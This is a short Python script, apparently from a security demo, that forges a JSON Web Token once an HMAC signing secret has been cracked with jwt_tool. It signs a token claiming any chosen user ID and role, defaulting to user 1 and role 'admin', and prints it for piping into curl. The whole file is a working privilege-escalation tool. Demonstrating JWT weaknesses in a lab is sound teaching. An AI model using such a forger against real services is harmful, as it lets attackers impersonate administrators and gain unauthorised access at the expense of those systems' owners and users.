"""Forge a JWT after cracking the secret.

Usage:
    python forge.py <secret> [--id <id>] [--role <role>]

Prints the forged token to stdout so it can be piped into curl. This is the
post-crack step of the demo: jwt_tool tells you the secret, then forge.py
mints a token claiming any user/role you want.
"""

import argparse
import jwt


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument('secret', help='The cracked secret')
    parser.add_argument('--id', default=1, type=int,
                        help='User ID to claim. Defaults to 1 (the admin '
                             'account in the demo scenario).')
    parser.add_argument('--role', default='admin')
    parser.add_argument('--alg', default='HS256')
    args = parser.parse_args()

    token = jwt.encode(
        {'id': args.id, 'role': args.role},
        args.secret,
        algorithm=args.alg,
    )
    # PyJWT 1.x returns bytes, PyJWT 2.x returns str.
    if isinstance(token, bytes):
        token = token.decode('utf-8')
    print(token)


if __name__ == '__main__':
    main()
